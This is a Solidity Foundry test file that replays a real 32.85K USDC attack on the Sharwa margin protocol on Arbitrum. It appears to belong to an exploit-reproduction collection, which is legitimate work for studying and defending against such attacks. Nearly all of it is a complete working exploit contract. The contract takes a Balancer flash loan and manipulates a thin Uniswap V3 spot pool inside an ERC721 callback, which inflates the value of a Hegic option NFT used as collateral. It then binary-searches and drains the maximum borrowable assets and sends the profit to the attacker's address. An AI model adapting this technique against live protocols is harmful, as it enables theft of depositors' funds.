// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 32.85K USDC
// Attacker : 0x4551835e7c40d2a3d407c89d6a91eff98285c681
// Attack Contract : 0x7e3c13314ceefc7578242d5eae9ed4dcbeb8d377
// Vulnerable Contract : 0x729cf665c09ef112c607290415a566fffa45826f
// Attack Tx : https://arbiscan.io/tx/0x05cfcfe9bdf8d19aaea3ba417e6559aee37c82120974e75335d06e56030f4dad

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x729cf665c09ef112c607290415a566fffa45826f#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/2975
//
// Sharwa valued Hegic option NFT collateral through a Uniswap V3 spot Quoter path. The attacker transferred the
// option NFT into a receiver contract, used the ERC721 callback to manipulate the USDC/USDC.e spot price, deposited
// the option as collateral, borrowed USDC/WETH/WBTC, swapped the proceeds back to USDC, repaid Balancer, and kept
// the remaining USDC.

address constant ATTACKER = 0x4551835e7C40d2A3D407C89D6a91eFF98285C681;
address constant HEGIC_POSITIONS_MANAGER = 0x5Fe380D68fEe022d8acd42dc4D36FbfB249a76d5;
address constant MARGIN_ACCOUNT_MANAGER = 0x7FBcAAd6DE35F10121707509050035ff9Ec8dAfd;
address constant SHARWA_ROUTER = 0x5b2f774050d590d54165872E4297cF9D2D90eD54;
address constant MARGIN_ACCOUNT = 0x069cdfF47380bFcFa40D84f70834779DAaE96726;
address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant USDC_TOKEN = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
address constant USDC_E_TOKEN = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
address constant WETH_TOKEN = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
address constant WBTC_TOKEN = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;

uint256 constant HEGIC_OPTION_ID = 16_129;
uint24 constant UNISWAP_FEE = 500;

interface IMarginAccountManager {
    function createMarginAccount() external returns (uint256);
}

interface ISharwaMarginRouter {
    function provideERC721(
        uint256 marginAccountID,
        address token,
        uint256 collateralTokenID
    ) external;
    function borrow(
        uint256 marginAccountID,
        address token,
        uint256 amount
    ) external;
    function withdrawERC20(
        uint256 marginAccountID,
        address token,
        uint256 amount
    ) external;
}

interface ISharwaMarginAccount {
    function tokenToLiquidityPool(
        address token
    ) external view returns (address);
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract ContractTest is BaseTestWithBalanceLog {
    SharwaMarginTradingExploit private exploit;

    function setUp() public {
        uint256 forkBlock = 458_233_155;
        vm.createSelectFork("arbitrum", forkBlock);

        fundingToken = USDC_TOKEN;
        attacker = ATTACKER;
        exploit = new SharwaMarginTradingExploit(ATTACKER);

        vm.label(ATTACKER, "Attacker / Profit Receiver");
        vm.label(address(exploit), "Local Attack Receiver");
        vm.label(HEGIC_POSITIONS_MANAGER, "Hegic PositionsManager");
        vm.label(MARGIN_ACCOUNT_MANAGER, "Sharwa MarginAccountManager");
        vm.label(SHARWA_ROUTER, "Sharwa MarginTradingRouter");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(UNISWAP_V3_ROUTER, "Uniswap V3 Router");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(USDC_E_TOKEN, "USDC.e");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(WBTC_TOKEN, "WBTC");
    }

    function testExploit() public balanceLog {
        uint256 attackerUsdcBefore = IERC20(USDC_TOKEN).balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        IERC721(HEGIC_POSITIONS_MANAGER).safeTransferFrom(ATTACKER, address(exploit), HEGIC_OPTION_ID);

        uint256 profit = IERC20(USDC_TOKEN).balanceOf(ATTACKER) - attackerUsdcBefore;
        assertGt(profit, 32_000_000_000, "USDC profit");
    }
}

contract SharwaMarginTradingExploit is IERC721Receiver {
    address private immutable profitReceiver;
    uint256 private activeMarginAccountId;

    constructor(
        address _profitReceiver
    ) {
        profitReceiver = _profitReceiver;
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        if (msg.sender == HEGIC_POSITIONS_MANAGER && tokenId == HEGIC_OPTION_ID) {
            startFlashLoan();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "not balancer");

        // step 1: push USDC into the thin USDC/USDC.e pool before Sharwa values the Hegic option.
        approveMax(USDC_TOKEN, UNISWAP_V3_ROUTER);
        swapExactInput(USDC_TOKEN, USDC_E_TOKEN, amounts[0]);

        // step 2: create a Sharwa margin account and deposit the callback-received Hegic option NFT.
        activeMarginAccountId = IMarginAccountManager(MARGIN_ACCOUNT_MANAGER).createMarginAccount();
        IERC721(HEGIC_POSITIONS_MANAGER).approve(SHARWA_ROUTER, HEGIC_OPTION_ID);
        ISharwaMarginRouter(SHARWA_ROUTER)
            .provideERC721(activeMarginAccountId, HEGIC_POSITIONS_MANAGER, HEGIC_OPTION_ID);

        // step 3: borrow the USDC amount Sharwa permits, then spend it into the same spot pool.
        borrowAndWithdrawMax(USDC_TOKEN);
        swapExactInput(USDC_TOKEN, USDC_E_TOKEN, IERC20(USDC_TOKEN).balanceOf(address(this)));

        // step 4: borrow the other supported assets against the inflated option value.
        borrowAndWithdrawMax(WETH_TOKEN);
        borrowAndWithdrawMax(WBTC_TOKEN);

        // step 5: unwind borrowed assets and remaining USDC.e back to USDC.
        approveMax(WETH_TOKEN, UNISWAP_V3_ROUTER);
        approveMax(WBTC_TOKEN, UNISWAP_V3_ROUTER);
        approveMax(USDC_E_TOKEN, UNISWAP_V3_ROUTER);
        swapExactInput(WETH_TOKEN, USDC_TOKEN, IERC20(WETH_TOKEN).balanceOf(address(this)));
        swapExactInput(WBTC_TOKEN, USDC_TOKEN, IERC20(WBTC_TOKEN).balanceOf(address(this)));
        swapExactInput(USDC_E_TOKEN, USDC_TOKEN, IERC20(USDC_E_TOKEN).balanceOf(address(this)));

        // step 6: repay Balancer and forward the remaining USDC to the historical profit receiver.
        IERC20(USDC_TOKEN).transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]);
        IERC20(USDC_TOKEN).transfer(profitReceiver, IERC20(USDC_TOKEN).balanceOf(address(this)));
    }

    function probeBorrowAndWithdraw(
        address token,
        uint256 amount
    ) external {
        require(msg.sender == address(this), "not self");
        borrowAndWithdraw(token, amount);
        revert BorrowProbeSucceeded();
    }

    function startFlashLoan() private {
        address[] memory tokens = new address[](1);
        tokens[0] = USDC_TOKEN;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 22_000_000_000;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function borrowAndWithdrawMax(
        address token
    ) private returns (uint256 amount) {
        address liquidityPool = ISharwaMarginAccount(MARGIN_ACCOUNT).tokenToLiquidityPool(token);
        uint256 high = IERC20(token).balanceOf(liquidityPool) + 1;
        uint256 low = 0;

        while (low + 1 < high) {
            uint256 mid = (low + high) / 2;
            if (canBorrowAndWithdraw(token, mid)) {
                low = mid;
            } else {
                high = mid;
            }
        }

        borrowAndWithdraw(token, low);
        return low;
    }

    function canBorrowAndWithdraw(
        address token,
        uint256 amount
    ) private returns (bool) {
        if (amount == 0) return true;

        try this.probeBorrowAndWithdraw(token, amount) {
            return false;
        } catch (bytes memory reason) {
            return errorSelector(reason) == BorrowProbeSucceeded.selector;
        }
    }

    function borrowAndWithdraw(
        address token,
        uint256 amount
    ) private {
        ISharwaMarginRouter(SHARWA_ROUTER).borrow(activeMarginAccountId, token, amount);
        ISharwaMarginRouter(SHARWA_ROUTER).withdrawERC20(activeMarginAccountId, token, amount);
    }

    function swapExactInput(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) private returns (uint256 amountOut) {
        if (amountIn == 0) return 0;
        amountOut = Uni_Router_V3(UNISWAP_V3_ROUTER)
            .exactInputSingle(
                Uni_Router_V3.ExactInputSingleParams({
                    tokenIn: tokenIn,
                    tokenOut: tokenOut,
                    fee: UNISWAP_FEE,
                    recipient: address(this),
                    deadline: block.timestamp + 300,
                    amountIn: amountIn,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
    }

    function approveMax(
        address token,
        address spender
    ) private {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function errorSelector(
        bytes memory reason
    ) private pure returns (bytes4 selector) {
        if (reason.length < 4) return bytes4(0);
        assembly {
            selector := mload(add(reason, 0x20))
        }
    }
}

error BorrowProbeSucceeded();
